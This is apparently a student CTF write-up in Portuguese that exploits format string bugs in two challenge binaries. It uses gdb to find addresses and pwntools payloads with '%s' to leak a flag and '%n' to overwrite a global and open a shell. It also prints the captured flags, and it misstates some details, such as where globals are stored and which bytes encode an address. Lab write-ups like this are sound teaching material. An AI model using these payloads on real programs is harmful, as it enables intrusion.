# CTF 3

## Primeira parte

Inicialmente exploramos os ficheiros disponibilizados na plataforma CTF que são os mesmos que estão a ser executados no servidor na porta 4004. 

Com o comando **checksec** verificamos que `program` (main.c compilado) não tem o binário randomizado mas existem proteções do endereço de retorno usando canários. 

```bash
$ checksec --file=program
```

Depois avaliamos o funcionamento do código `main.c`. O input é guardado num buffer de 32 bytes através da função scanf e depois impresso por **printf** para sem argumentos adicionais. Assim, é possível usar "format string attack" para usurpar o seu funcionamento, já que não há randomização dos endereços.

Quando a função `load_flag` é invocada lê a flag contida no diretório para outro buffer que é uma variável global e, portanto, está alocado na Heap. Ao descobrir o endereço da função é possível retornar o valor da string do buffer.

Para descobrir o endereço da função, usamos o debugger gdb:

```bash
$ gdb program
$ p load_flag # 
```

O resultado foi o endereço de retorno "0x08049256", que é "\x60\xC0\x04\x08" em formato de string.

Usando o programa em python disponibilizado, injetamos o input que contém o exploit:

```python
p.recvuntil(b"got:")
p.sendline(b"\x60\xC0\x04\x08%s")
p.interactive()
```

![CTF 3 A](../img/ctf3task1.png)

Ao executar conseguimos ter acesso ao conteúdo do ficheiro `flag.txt` e à flag do desafio, `flag{07147311b8387a60fea61e241035bf04}`.

## Segunda parte

Após avaliar o novo `program` que continua sem randomização de endereços, avaliamos o funcionamento do código `main.c`. Desta vez uma bash é lançada se o valor de `key` for 0xBEEF, ou seja, 48879 em decimal. Esta backdoor é suficiente para controlar o servidor e assim consultar o conteúdo do ficheiro **flag.txt**.

Para manipular o valor de key, que é uma variável global e por isso está alocada na Heap, recorremos à format string attack do input através da opção '%n'. Inicialmente precisamos do valor do endereço da variável key, e para isso recorremos ao gdb:

```bash
$ gdb program
$ p &key
```

O resultado foi o endereço "0x0804c034" que é "\x08\x04\xC0\x34" em hexadecimal. Para escrever 48879 neste endereço modificamos ligeiramente a string dada como input: após o endereço pretendido (4 bytes) é necessário escrever exatamente 48879 - 4 = 48875 bytes antes de '%n'. Como o buffer de entrada só tem no máximo 32 bytes disponíveis, recorremos à expressão compacta de leitura do printf `%.Nx`, com N = 48875.

```python
p.recvuntil(b"here...")
p.sendline(b"\x34\xC0\x04\x08%.48875x%n")
p.interactive()
```

![CTF 3 B](../img/ctf3task2.png)

Ao executar conseguimos ter acesso ao conteúdo do ficheiro `flag.txt` e à flag do desafio, `flag{67900caf37372586bef79f7dc99581fd}`.
